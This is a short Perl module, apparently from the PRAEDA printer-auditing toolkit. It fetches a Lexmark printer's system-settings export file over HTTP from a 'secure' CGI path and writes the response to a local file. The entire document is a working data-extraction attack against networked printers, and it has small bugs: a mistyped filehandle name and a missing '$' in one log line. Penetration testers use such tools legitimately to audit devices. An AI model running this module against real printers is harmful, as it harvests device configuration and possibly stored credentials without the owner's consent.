# Lexmark printer Module for extracting system settings
######################################################
#                  PRAEDA Module #MP0017             #
#          Copyright (C) 2011 Foofus.net	     #
#             Deral "percX" Heiland                  #
######################################################
package MP0017;
sub MP0017
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Create/edit log file for export 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "\n**********Attempting to extracting system export settings .UCF file $TARGET:$PORTS : JOB MP0017**********\n";
print OUTFILE "\n**********Attempting to extracting system export settings .UCF file $TARGET:PORTS : JOB MP0017**********\n";

my $browser = LWP::UserAgent->new(timeout => 15);

# Start export of system settings 
     my $response = $browser->get("http$web://$TARGET:$PORTS/cgi-bin/exportfile/printer/config/secure/settingfile.ucf",);
     open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-lexmark-settingfile.ucf") || die("Failed to open  Output file $TARGET-$PORTS-lexmark-settingfile.ucf \n");
     print JOBACCTOUTFILE $response->content;            

# operation completed close out output files
close(OUTFILE);
close(JOBACCOUTFILE);

}
		
1;
